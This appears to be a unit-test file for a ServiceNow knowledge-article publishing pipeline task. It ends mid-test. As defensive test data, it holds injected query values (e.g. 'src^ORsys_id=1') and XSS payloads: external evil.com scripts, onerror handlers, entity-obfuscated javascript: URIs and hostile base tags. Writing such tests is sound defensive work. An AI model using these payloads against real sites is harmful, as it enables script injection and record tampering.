/**
 * Tests/L0.ts
 * Unit tests for the PublishKbArticle task modules.
 * HTTP calls are mocked with nock; tasks.setSecret is spy-patched.
 */
import { describe, it, before, after, afterEach } from 'mocha';
import assert = require('assert');
import nock = require('nock');
import tasks = require('azure-pipelines-task-lib/task');
import * as ttm from 'azure-pipelines-task-lib/mock-test';

import * as fs from 'fs';
import * as net from 'net';
import * as os from 'os';
import * as nodePath from 'path';
import * as auth from '../src/auth';
import * as htmlValidate from '../src/html-validate';
import * as client from '../src/servicenow-client';
import { formatDryRunReport, DryRunPlan } from '../src/dry-run';
import { extractLocalImageRefs, rewriteImageSrcs } from '../src/image-rewrite';
import { processArticleImages, syncImageAttachment, contentTypeFor, fileSha256, listArticleAttachments, uploadAttachment } from '../src/attachments';
import * as manifest from '../src/manifest';
import { snRequest, withRetry } from '../src/servicenow-http';

const INSTANCE = 'testinstance';
const BASE_URL = `https://${INSTANCE}.service-now.com`;
const HEADERS = {
    Authorization: 'Bearer test-token',
    'Content-Type': 'application/json',
    Accept: 'application/json',
};

// ---------------------------------------------------------------------------
// Spy helpers for tasks.setSecret / tasks.warning
// ---------------------------------------------------------------------------
const capturedSecrets: string[] = [];
const capturedWarnings: string[] = [];
let origSetSecret: typeof tasks.setSecret;
let origWarning: typeof tasks.warning;

before(() => {
    origSetSecret = tasks.setSecret;
    // Monkey-patch on the shared CommonJS module object — works because both
    // this file and auth.ts import the same cached module instance.
    (tasks as Record<string, unknown>)['setSecret'] = (val: string) => {
        capturedSecrets.push(val);
    };
    origWarning = tasks.warning;
    (tasks as Record<string, unknown>)['warning'] = (message: string) => {
        capturedWarnings.push(message);
    };
    // Prevent nock from allowing unmocked requests to escape to the network.
    nock.disableNetConnect();
});

after(() => {
    tasks.setSecret = origSetSecret;
    (tasks as Record<string, unknown>)['warning'] = origWarning;
    nock.enableNetConnect();
});

afterEach(() => {
    capturedSecrets.length = 0;
    capturedWarnings.length = 0;
    nock.cleanAll();
});

// ===========================================================================
// servicenow-client — sysparm_query injection guard (assertQueryValueSafe)
// ===========================================================================
describe('servicenow-client sysparm_query injection guard', () => {
    const GUARD_MSG = /must not contain '\^' or newline|InvalidQueryValue/;

    it('findOrCreateCategory rejects a kbId containing ^ (encoded-query control char)', async () => {
        await assert.rejects(() => client.findOrCreateCategory(INSTANCE, HEADERS, 'kb^label=evil', 'cat'), GUARD_MSG);
    });

    it('findOrCreateCategory rejects a categoryName containing a newline', async () => {
        await assert.rejects(() => client.findOrCreateCategory(INSTANCE, HEADERS, 'kb1', 'cat\nname'), GUARD_MSG);
    });

    it('findOrCreateCategory rejects a parentCategoryId containing ^', async () => {
        await assert.rejects(() => client.findOrCreateCategory(INSTANCE, HEADERS, 'kb1', 'cat', 'p^q'), GUARD_MSG);
    });

    it('findArticleBySourceKey rejects a sourceKey containing ^ (markdown front-matter injection)', async () => {
        await assert.rejects(() => client.findArticleBySourceKey(INSTANCE, HEADERS, 'src^ORsys_id=1'), GUARD_MSG);
    });

    it('findArticleBySourceKey rejects a sourceKey containing a newline', async () => {
        await assert.rejects(() => client.findArticleBySourceKey(INSTANCE, HEADERS, 'src\nkey'), GUARD_MSG);
    });

    it('findArticleBySourceKey rejects a kbId containing ^', async () => {
        await assert.rejects(() => client.findArticleBySourceKey(INSTANCE, HEADERS, 'cleankey', 'kb^1'), GUARD_MSG);
    });

    it('listArticleAttachments rejects an articleId containing ^ (encoded-query control char)', async () => {
        await assert.rejects(() => listArticleAttachments(INSTANCE, HEADERS, 'id^ORtable_sys_id=1'), GUARD_MSG);
    });

    it('listArticleAttachments rejects an articleId containing a newline', async () => {
        await assert.rejects(() => listArticleAttachments(INSTANCE, HEADERS, 'id\nvalue'), GUARD_MSG);
    });

    it('allows clean values through the guard (mocked HTTP returns no match)', async () => {
        nock(BASE_URL).get('/api/now/table/kb_knowledge').query(true).reply(200, { result: [] });
        const res = await client.findArticleBySourceKey(INSTANCE, HEADERS, 'clean-source-key');
        assert.strictEqual(res, null);
    });
});

// ===========================================================================
// auth — getOAuthToken
// ===========================================================================
describe('auth.getOAuthToken', () => {
    it('POSTs to oauth_token.do and returns access_token', async () => {
        nock(BASE_URL)
            .post('/oauth_token.do')
            .reply(200, { access_token: 'tok_abc123' });

        const token = await auth.getOAuthToken(INSTANCE, 'clientId', 'clientSecret');
        assert.strictEqual(token, 'tok_abc123');
    });

    it('calls tasks.setSecret on the returned token', async () => {
        nock(BASE_URL)
            .post('/oauth_token.do')
            .reply(200, { access_token: 'secret_token' });

        await auth.getOAuthToken(INSTANCE, 'cid', 'csec');
        assert.ok(
            capturedSecrets.includes('secret_token'),
            'tasks.setSecret should be called with the access token',
        );
    });

    it('calls tasks.setSecret on the clientSecret input itself, not just the returned token', async () => {
        nock(BASE_URL)
            .post('/oauth_token.do')
            .reply(200, { access_token: 'irrelevant_token' });

        await auth.getOAuthToken(INSTANCE, 'cid', 'super-secret-client-value');
        assert.ok(
            capturedSecrets.includes('super-secret-client-value'),
            'tasks.setSecret should be called with the clientSecret input, so it is masked even if it leaks ' +
            'before the token exchange completes (e.g. in a request-body log or an unhandled error)',
        );
    });

    it('retries a transient 5xx on the token endpoint then succeeds (#562)', async () => {
        nock(BASE_URL)
            .post('/oauth_token.do')
            .reply(503, { error: 'busy' })
            .post('/oauth_token.do')
            .reply(200, { access_token: 'tok_after_retry' });

        const token = await auth.getOAuthToken(INSTANCE, 'cid', 'csec');
        assert.strictEqual(token, 'tok_after_retry');
    });

    it('throws on HTTP error', async () => {
        nock(BASE_URL)
            .post('/oauth_token.do')
            .reply(401, { error: 'invalid_client' });

        await assert.rejects(
            () => auth.getOAuthToken(INSTANCE, 'bad', 'creds'),
            /Error obtaining OAuth token|OAuthTokenError/,
        );
    });
});

// ===========================================================================
// auth — basicAuthHeader
// ===========================================================================
describe('auth.basicAuthHeader', () => {
    it('returns correct base64 Basic header', () => {
        const header = auth.basicAuthHeader('alice', 'p@ss');
        const expected = `Basic ${Buffer.from('alice:p@ss').toString('base64')}`;
        assert.strictEqual(header, expected);
    });

    it('calls tasks.setSecret on the password', () => {
        auth.basicAuthHeader('bob', 'mypassword');
        assert.ok(
            capturedSecrets.includes('mypassword'),
            'tasks.setSecret should be called with the password',
        );
    });

    it('also calls tasks.setSecret on the base64-encoded credentials, not just the raw password', () => {
        const header = auth.basicAuthHeader('carol', 'anotherpassword');
        const encoded = Buffer.from('carol:anotherpassword').toString('base64');
        assert.ok(
            capturedSecrets.includes(encoded),
            'tasks.setSecret should also be called with the base64-encoded credentials, since ADO log ' +
            'masking matches literal registered strings and the encoded header value is a different ' +
            'string than the raw password',
        );
        assert.strictEqual(header, `Basic ${encoded}`);
    });
});

// ===========================================================================
// servicenow-http — withRetry
// ===========================================================================
describe('servicenow-http.withRetry', () => {
    it('retries a bounded number of times on a 5xx then succeeds', async () => {
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .reply(503, { error: 'busy' })
            .post('/api/now/table/kb_knowledge')
            .reply(201, { result: { sys_id: 'retried_id', number: 'KB0099', workflow_state: 'draft' } });

        const logs: string[] = [];
        const resp = await withRetry(
            () => snRequest('POST', `${BASE_URL}/api/now/table/kb_knowledge`, { headers: HEADERS, body: {} }),
            { retries: 2, baseDelayMs: 1, log: (m) => logs.push(m) },
        );
        assert.strictEqual((resp.data.result as { sys_id: string }).sys_id, 'retried_id');
        assert.strictEqual(logs.length, 1, 'should log exactly one retry attempt');
    });

    it('does not retry a 4xx -- fails on the first attempt', async () => {
        let calls = 0;
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .reply(() => {
                calls++;
                return [400, { error: 'bad request' }];
            });

        const logs: string[] = [];
        await assert.rejects(
            withRetry(
                () => snRequest('POST', `${BASE_URL}/api/now/table/kb_knowledge`, { headers: HEADERS, body: {} }),
                { retries: 2, baseDelayMs: 1, log: (m) => logs.push(m) },
            ),
            /failed with status 400/,
        );
        assert.strictEqual(calls, 1, 'a 4xx must not be retried');
        assert.strictEqual(logs.length, 0);
    });

    it('retries on a pure transport failure (no response received)', async () => {
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .replyWithError('socket hang up')
            .post('/api/now/table/kb_knowledge')
            .reply(201, { result: { sys_id: 'ok_after_transport_retry', number: 'KB0100', workflow_state: 'draft' } });

        const logs: string[] = [];
        const resp = await withRetry(
            () => snRequest('POST', `${BASE_URL}/api/now/table/kb_knowledge`, { headers: HEADERS, body: {} }),
            { retries: 2, baseDelayMs: 1, log: (m) => logs.push(m) },
        );
        assert.strictEqual((resp.data.result as { sys_id: string }).sys_id, 'ok_after_transport_retry');
        assert.strictEqual(logs.length, 1);
    });

    it('retries a 429 Too Many Requests then succeeds (#584)', async () => {
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .reply(429, { error: 'rate limited' })
            .post('/api/now/table/kb_knowledge')
            .reply(201, { result: { sys_id: 'ok_after_429', number: 'KB0101', workflow_state: 'draft' } });

        const logs: string[] = [];
        const resp = await withRetry(
            () => snRequest('POST', `${BASE_URL}/api/now/table/kb_knowledge`, { headers: HEADERS, body: {} }),
            { retries: 2, baseDelayMs: 1, log: (m) => logs.push(m) },
        );
        assert.strictEqual((resp.data.result as { sys_id: string }).sys_id, 'ok_after_429');
        assert.strictEqual(logs.length, 1, 'a 429 should trigger exactly one retry here');
    });

    it('honors a 429 Retry-After header instead of the exponential backoff (#584)', async () => {
        // Retry-After: 0 (retry immediately) is honored, so the retry sleep is ~0ms
        // rather than the 5000ms baseDelayMs backoff. A generous upper bound proves
        // the header was honored without a brittle exact-timing assertion (and a
        // regression that ignored it would blow the 5s wait, not silently pass).
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .reply(429, { error: 'rate limited' }, { 'Retry-After': '0' })
            .post('/api/now/table/kb_knowledge')
            .reply(201, { result: { sys_id: 'ok_after_retry_after', number: 'KB0102', workflow_state: 'draft' } });

        const start = Date.now();
        const resp = await withRetry(
            () => snRequest('POST', `${BASE_URL}/api/now/table/kb_knowledge`, { headers: HEADERS, body: {} }),
            { retries: 2, baseDelayMs: 5000 },
        );
        const elapsed = Date.now() - start;
        assert.strictEqual((resp.data.result as { sys_id: string }).sys_id, 'ok_after_retry_after');
        assert.ok(elapsed < 1000, `expected the honored 0s Retry-After, not the 5s backoff; elapsed ${elapsed}ms`);
    });
});

// ===========================================================================
// servicenow-client — createKnowledgeArticle (create-new path)
// ===========================================================================
describe('client.createKnowledgeArticle', () => {
    it('POSTs to kb_knowledge and returns the new article', async () => {
        const articlePayload = {
            sys_id: 'new_sys_id',
            number: 'KB0001',
            short_description: 'Test Article',
            workflow_state: 'draft',
        };
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .reply(201, { result: articlePayload });

        const article = await client.createKnowledgeArticle(
            INSTANCE, HEADERS, 'kb123', 'Test Article', '<p>Content</p>', 'author1',
        );
        assert.strictEqual(article.sys_id, 'new_sys_id');
        assert.strictEqual(article.number, 'KB0001');
    });

    it('includes wiki-source sentinel in meta_description when sourceKey is given', async () => {
        let capturedBody: Record<string, unknown> = {};
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge', (body: Record<string, unknown>) => {
                capturedBody = body;
                return true;
            })
            .reply(201, { result: { sys_id: 's1', number: 'KB0002', workflow_state: 'draft' } });

        await client.createKnowledgeArticle(
            INSTANCE, HEADERS, 'kb123', 'Title', '<p>HTML</p>', 'author',
            undefined, undefined, 'draft', 'my-source-key',
        );
        assert.strictEqual(
            capturedBody['meta_description'],
            'wiki-source: my-source-key',
        );
    });

    it('maps workflowState=publish to workflow_state=published', async () => {
        let capturedBody: Record<string, unknown> = {};
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge', (body: Record<string, unknown>) => {
                capturedBody = body;
                return true;
            })
            .reply(201, { result: { sys_id: 's2', number: 'KB0003', workflow_state: 'published' } });

        await client.createKnowledgeArticle(
            INSTANCE, HEADERS, 'kb123', 'Title', '<p>HTML</p>', 'author',
            undefined, undefined, 'publish',
        );
        assert.strictEqual(capturedBody['workflow_state'], 'published');
    });

    it('#372/#29: throws a clear error instead of a generic TypeError when a 2xx response is not a JSON article object', async () => {
        // Mirrors servicenow-http.ts's documented fallback: a non-JSON 2xx body
        // (e.g. a corporate proxy/WAF returning an HTML page) parses to `data = {}`,
        // so `result` is undefined -- this must be a clear ArticleNotObject error,
        // not an unguarded `undefined.sys_id` crash further up the call chain.
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .reply(200, '<html>Not the ServiceNow API you expected</html>');

        await assert.rejects(
            () => client.createKnowledgeArticle(INSTANCE, HEADERS, 'kb123', 'Title', '<p>HTML</p>', 'author'),
            /no article object in "result"|ArticleNotObject/,
        );
    });
});

// ===========================================================================
// servicenow-client — updateKnowledgeArticle (update path)
// ===========================================================================
// ===========================================================================
// servicenow-client — getArticle / articleId path encoding (#449)
// ===========================================================================
describe('client.getArticle', () => {
    it('#449: encodeURIComponent-encodes an articleId containing a path-manipulation character', async () => {
        // Without encoding, an articleId of 'a/b' would splice an extra path
        // segment into the REST URL. nock matches the literal outgoing path, so
        // this only passes if the client sends the percent-encoded segment.
        const article = { sys_id: 'a/b', number: 'KB0099', short_description: 'T', workflow_state: 'draft' };
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/a%2Fb')
            .reply(200, { result: article });

        const found = await client.getArticle(INSTANCE, HEADERS, 'a/b');
        assert.strictEqual(found.sys_id, 'a/b');
    });

    it('#372/#29: throws a clear error instead of a generic TypeError when a 2xx response is not a JSON article object', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/art_missing')
            .reply(200, '<html>Not the ServiceNow API you expected</html>');

        await assert.rejects(
            () => client.getArticle(INSTANCE, HEADERS, 'art_missing'),
            /no article object in "result"|ArticleNotObject/,
        );
    });

    it('#506: retries a transient 503 on the read-only GET, then succeeds', async () => {
        const article = { sys_id: 'art_retry', number: 'KB0098', short_description: 'T', workflow_state: 'draft' };
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/art_retry')
            .reply(503, { error: 'busy' })
            .get('/api/now/table/kb_knowledge/art_retry')
            .reply(200, { result: article });

        const found = await client.getArticle(INSTANCE, HEADERS, 'art_retry');
        assert.strictEqual(found.sys_id, 'art_retry');
    });
});

describe('client.updateKnowledgeArticle', () => {
    it('GETs existing article then PATCHes with updated fields', async () => {
        const existingArticle = {
            sys_id: 'art_001',
            number: 'KB0010',
            short_description: 'Old Title',
            workflow_state: 'draft',
            kb_knowledge_base: 'kb123',
        };
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/art_001')
            .reply(200, { result: existingArticle });

        let patchedBody: Record<string, unknown> = {};
        nock(BASE_URL)
            .patch('/api/now/table/kb_knowledge/art_001', (body: Record<string, unknown>) => {
                patchedBody = body;
                return true;
            })
            .reply(200, { result: { ...existingArticle, short_description: 'New Title' } });

        const updated = await client.updateKnowledgeArticle(
            INSTANCE, HEADERS, 'art_001', 'New Title',
        );
        assert.strictEqual(updated.short_description, 'New Title');
        assert.strictEqual(patchedBody['short_description'], 'New Title');
    });

    it('extracts kb_id from reference-field object when kb_knowledge_base is a dict', async () => {
        const existingArticle = {
            sys_id: 'art_002',
            number: 'KB0011',
            short_description: 'Title',
            workflow_state: 'draft',
            // Reference field returned as object with value/link
            kb_knowledge_base: { value: 'kb_ref_id', link: 'https://...' },
        };
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/art_002')
            .reply(200, { result: existingArticle });

        nock(BASE_URL)
            .patch('/api/now/table/kb_knowledge/art_002')
            .reply(200, { result: { ...existingArticle, short_description: 'Updated' } });

        const updated = await client.updateKnowledgeArticle(
            INSTANCE, HEADERS, 'art_002', 'Updated',
        );
        assert.strictEqual(updated.short_description, 'Updated');
    });

    it('stamps wiki-source sentinel when missing', async () => {
        const existingArticle = {
            sys_id: 'art_003',
            number: 'KB0012',
            short_description: 'Title',
            workflow_state: 'draft',
            kb_knowledge_base: 'kb123',
            meta_description: '',
        };
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/art_003')
            .reply(200, { result: existingArticle });

        let patchedBody: Record<string, unknown> = {};
        nock(BASE_URL)
            .patch('/api/now/table/kb_knowledge/art_003', (body: Record<string, unknown>) => {
                patchedBody = body;
                return true;
            })
            .reply(200, { result: { ...existingArticle, meta_description: 'wiki-source: key1' } });

        await client.updateKnowledgeArticle(
            INSTANCE, HEADERS, 'art_003', 'Title', undefined, undefined,
            undefined, undefined, undefined, 'key1',
        );
        assert.strictEqual(patchedBody['meta_description'], 'wiki-source: key1');
    });

    it('#372/#29: throws a clear error instead of a generic TypeError when a 2xx PATCH response is not a JSON article object', async () => {
        const existingArticle = {
            sys_id: 'art_004',
            number: 'KB0013',
            short_description: 'Title',
            workflow_state: 'draft',
            kb_knowledge_base: 'kb123',
        };
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge/art_004')
            .reply(200, { result: existingArticle });
        nock(BASE_URL)
            .patch('/api/now/table/kb_knowledge/art_004')
            .reply(200, '<html>Not the ServiceNow API you expected</html>');

        await assert.rejects(
            () => client.updateKnowledgeArticle(INSTANCE, HEADERS, 'art_004', 'New Title'),
            /no article object in "result"|ArticleNotObject/,
        );
    });
});

// ===========================================================================
// servicenow-client — findArticleBySourceKey
// ===========================================================================
describe('client.findArticleBySourceKey', () => {
    it('returns sys_id when exactly one article matches', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge')
            .query(true) // match any query params
            .reply(200, {
                result: [{ sys_id: 'match_id', number: 'KB0020', short_description: 'Found' }],
            });

        const id = await client.findArticleBySourceKey(INSTANCE, HEADERS, 'my-key');
        assert.strictEqual(id, 'match_id');
    });

    it('returns null when no articles match', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge')
            .query(true)
            .reply(200, { result: [] });

        const id = await client.findArticleBySourceKey(INSTANCE, HEADERS, 'missing-key');
        assert.strictEqual(id, null);
    });

    it('throws on key collision (2+ results)', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge')
            .query(true)
            .reply(200, {
                result: [
                    { sys_id: 'id1', number: 'KB0021' },
                    { sys_id: 'id2', number: 'KB0022' },
                ],
            });

        await assert.rejects(
            () => client.findArticleBySourceKey(INSTANCE, HEADERS, 'dup-key'),
            /Key collision|SourceKeyCollision/,
        );
    });

    it('#372/#29 follow-up: returns null (not a TypeError) when a 2xx response is not a JSON array', async () => {
        // servicenow-http.ts defaults a non-JSON 2xx body to `data = {}` -- an
        // object, not an array. The old `(result || [])` cast kept the truthy
        // object and crashed on results[0]; Array.isArray must reject it to [].
        nock(BASE_URL)
            .get('/api/now/table/kb_knowledge')
            .query(true)
            .reply(200, '<html>Not the ServiceNow API you expected</html>');

        const id = await client.findArticleBySourceKey(INSTANCE, HEADERS, 'my-key');
        assert.strictEqual(id, null);
    });
});

// ===========================================================================
// servicenow-client — getKbCategories
// ===========================================================================
describe('client.getKbCategories', () => {
    it('returns the category list', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [{ sys_id: 'cat1', label: 'General' }] });

        const categories = await client.getKbCategories(INSTANCE, HEADERS, 'kb123');
        assert.strictEqual(categories.length, 1);
        assert.strictEqual(categories[0].label, 'General');
    });

    it('returns an empty array (not a crash) when a 2xx response is not a JSON array', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, '<html>Not the ServiceNow API you expected</html>');

        const categories = await client.getKbCategories(INSTANCE, HEADERS, 'kb123');
        assert.deepStrictEqual(categories, []);
    });
});

// ===========================================================================
// servicenow-client — category auto-create
// ===========================================================================
describe('client.findOrCreateCategory', () => {
    it('returns existing category sys_id when found', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, {
                result: [{ sys_id: 'cat_existing', label: 'Terraform', kb_knowledge_base: 'kb123' }],
            });

        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'Terraform');
        assert.strictEqual(id, 'cat_existing');
    });

    it('does NOT request sysparm_display_value=all (would nest sys_id as an object)', async () => {
        // Regression guard: with display_value=all, ServiceNow returns every field
        // as { value, display_value }, breaking the plain-string sys_id read.
        let capturedQuery: Record<string, string | string[] | undefined> = {};
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query((q) => { capturedQuery = q; return true; })
            .reply(200, {
                result: [{ sys_id: 'cat_plain', label: 'Terraform', kb_knowledge_base: 'kb123' }],
            });

        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'Terraform');
        assert.strictEqual(id, 'cat_plain');
        assert.ok(typeof id === 'string', 'sys_id must be a plain string');
        assert.strictEqual(
            capturedQuery['sysparm_display_value'],
            undefined,
            'query must not set sysparm_display_value=all',
        );
    });

    it('creates category when search returns empty (autoCreate=true)', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [] });

        nock(BASE_URL)
            .post('/api/now/table/kb_category')
            .reply(201, { result: { sys_id: 'new_cat_id', label: 'NewCategory' } });

        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'NewCategory');
        assert.strictEqual(id, 'new_cat_id');
    });

    it('returns null when not found and autoCreate=false', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [] });

        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'Ghost', undefined, false);
        assert.strictEqual(id, null);
    });

    it('#506: retries a transient 503 on the get-or-create createCategory POST, then succeeds', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [] });

        nock(BASE_URL)
            .post('/api/now/table/kb_category')
            .reply(503, { error: 'busy' })
            .post('/api/now/table/kb_category')
            .reply(201, { result: { sys_id: 'retried_cat_id', label: 'RetriedCategory' } });

        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'RetriedCategory');
        assert.strictEqual(id, 'retried_cat_id');
    });

    // -----------------------------------------------------------------------
    // #524: createCategory response-shape guard
    // -----------------------------------------------------------------------

    it('#524: throws a clear diagnostic when the create response "result" is an array, not an object', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [] });

        nock(BASE_URL)
            .post('/api/now/table/kb_category')
            .reply(201, { result: [{ sys_id: 'unexpected_array_shape' }] });

        await assert.rejects(
            () => client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'ArrayShape'),
            /no category object in "result"|CategoryNotObject/,
        );
    });

    it('#524: throws a clear diagnostic when the create response "result" is a string, not an object', async () => {
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [] });

        nock(BASE_URL)
            .post('/api/now/table/kb_category')
            .reply(201, { result: 'not an object' });

        await assert.rejects(
            () => client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'StringShape'),
            /no category object in "result"|CategoryNotObject/,
        );
    });

    it('#524: preserves the get-or-create fallback contract -- a valid-object-but-no-sys_id "result" (e.g. a nested error body) does not throw, returns null', async () => {
        // Mirrors assertArticleResult's own shallow shape check: a plain object
        // that isn't the expected record shape (here, a ServiceNow error body
        // returned with a 2xx status) is not itself invalid JSON structure, so it
        // must fall through to resolveKbCategory's existing "no category" fallback
        // rather than failing the whole publish.
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [] });

        nock(BASE_URL)
            .post('/api/now/table/kb_category')
            .reply(200, { result: { error: { message: 'no view for kb_category' }, status: 'failure' } });

        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'NestedErrorShape');
        assert.strictEqual(id, null);
    });

    it('creates subcategory under parent category', async () => {
        // Parent search
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [{ sys_id: 'parent_id', label: 'AWS', kb_knowledge_base: 'kb123' }] });

        // Subcategory search (empty)
        nock(BASE_URL)
            .get('/api/now/table/kb_category')
            .query(true)
            .reply(200, { result: [] });

        // Subcategory create
        nock(BASE_URL)
            .post('/api/now/table/kb_category')
            .reply(201, { result: { sys_id: 'sub_id', label: 'EC2' } });

        // createKnowledgeArticle with category+subcategory triggers this sequence
        nock(BASE_URL)
            .post('/api/now/table/kb_knowledge')
            .reply(201, { result: { sys_id: 'art_cat', number: 'KB0030', workflow_state: 'draft' } });

        const article = await client.createKnowledgeArticle(
            INSTANCE, HEADERS, 'kb123', 'EC2 Guide', '<p>Content</p>', 'author',
            'AWS', 'EC2',
        );
        assert.strictEqual(article.sys_id, 'art_cat');
    });
});

// ===========================================================================
// servicenow-client — changeWorkflowState (direct PATCH)
// ===========================================================================
describe('client.changeWorkflowState', () => {
    it('publishes via a direct PATCH of workflow_state=published (no /publish action)', async () => {
        const articleId = 'pub_art_001';
        let capturedBody: Record<string, unknown> = {};
        // Only the PATCH is mocked. The Table API has no /publish sub-resource, so if the code
        // attempted POST .../publish, nock would fail the test as an unmatched request.
        nock(BASE_URL)
            .patch(`/api/now/table/kb_knowledge/${articleId}`, (body: Record<string, unknown>) => {
                capturedBody = body;
                return true;
            })
            .reply(200, { result: { sys_id: articleId, number: 'KB0040', workflow_state: 'published' } });

        const article = await client.changeWorkflowState(INSTANCE, HEADERS, articleId, 'publish');
        assert.strictEqual(article.workflow_state, 'published');
        assert.strictEqual(capturedBody['workflow_state'], 'published');
    });

    it('uses PATCH directly for non-publish states', async () => {
        const articleId = 'draft_art_001';
        nock(BASE_URL)
            .patch(`/api/now/table/kb_knowledge/${articleId}`)
            .reply(200, { result: { sys_id: articleId, workflow_state: 'draft' } });

        const article = await client.changeWorkflowState(INSTANCE, HEADERS, articleId, 'draft');
        assert.strictEqual(article.workflow_state, 'draft');
    });

    it('#372/#29: throws a clear error instead of a generic TypeError when a 2xx response is not a JSON article object', async () => {
        const articleId = 'pub_art_002';
        nock(BASE_URL)
            .patch(`/api/now/table/kb_knowledge/${articleId}`)
            .reply(200, '<html>Not the ServiceNow API you expected</html>');

        await assert.rejects(
            () => client.changeWorkflowState(INSTANCE, HEADERS, articleId, 'publish'),
            /no article object in "result"|ArticleNotObject/,
        );
    });
});

// ===========================================================================
// html-validate
// ===========================================================================
describe('htmlValidate.validateHtmlContent', () => {
    it('does not throw on valid HTML', () => {
        assert.doesNotThrow(() =>
            htmlValidate.validateHtmlContent('<html><body><p>Hello</p></body></html>'),
        );
    });

    it('throws on external script when force=false', () => {
        const html = '<html><body><script src="https://evil.com/x.js"></script></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /External script sources are not allowed|ExternalScriptNotAllowed/,
        );
    });

    it('throws on external script even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><body><script src="https://cdn.example.com/lib.js"></script></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /External script sources are not allowed|ExternalScriptNotAllowed/,
        );
    });

    it('throws on an inline <script> element when force=false', () => {
        const html = '<html><body><script>alert(1)</script></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /Inline <script> elements are not allowed|InlineScriptNotAllowed/,
        );
    });

    it('throws on an inline <script> even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><body><script>alert(1)</script></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /Inline <script> elements are not allowed|InlineScriptNotAllowed/,
        );
    });

    it('throws on an inline event-handler attribute (onerror) when force=false', () => {
        const html = '<html><body><img src="x" onerror="alert(1)"></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /event-handler attributes .* are not allowed|EventHandlerNotAllowed/,
        );
    });

    it('throws on an inline event-handler even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><body><img src="x" onerror="alert(1)"></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /event-handler attributes .* are not allowed|EventHandlerNotAllowed/,
        );
    });

    it('throws on a javascript: URI when force=false', () => {
        const html = '<html><body><a href="javascript:alert(1)">x</a></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /javascript:.*URIs are not allowed|DangerousUriNotAllowed/,
        );
    });

    it('throws on a javascript: URI obfuscated with an HTML-entity-encoded control char (#446)', () => {
        // Browsers strip ASCII tab/newline/CR before parsing a URL scheme, so a
        // naive trim()+startsWith('javascript:') check would miss "jav&#9;ascript:".
        const cases = ['jav&#9;ascript:alert(1)', 'jav&#10;ascript:alert(1)', 'jav&#13;ascript:alert(1)', 'jav&Tab;ascript:alert(1)', '&#1;javascript:alert(1)'];
        for (const payload of cases) {
            const html = `<html><body><a href="${payload}">x</a></body></html>`;
            assert.throws(
                () => htmlValidate.validateHtmlContent(html, false),
                /javascript:.*URIs are not allowed|DangerousUriNotAllowed/,
                `expected a throw for payload: ${payload}`,
            );
        }
    });

    it('throws on a <base> element when force=false', () => {
        const html = '<html><head><base href="//evil.example.com/"></head><body><p>x</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /<base> elements and <meta http-equiv="refresh">|BaseOrMetaRefreshNotAllowed/,
        );
    });

    it('throws on a javascript: <meta http-equiv="refresh"> when force=false', () => {
        const html = '<html><head><meta http-equiv="refresh" content="0;url=javascript:alert(1)"></head><body><p>x</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /<base> elements and <meta http-equiv="refresh">|BaseOrMetaRefreshNotAllowed/,
        );
    });

    it('does not throw on a benign <meta> tag', () => {
        const html = '<html><head><meta charset="utf-8"></head><body><p>x</p></body></html>';
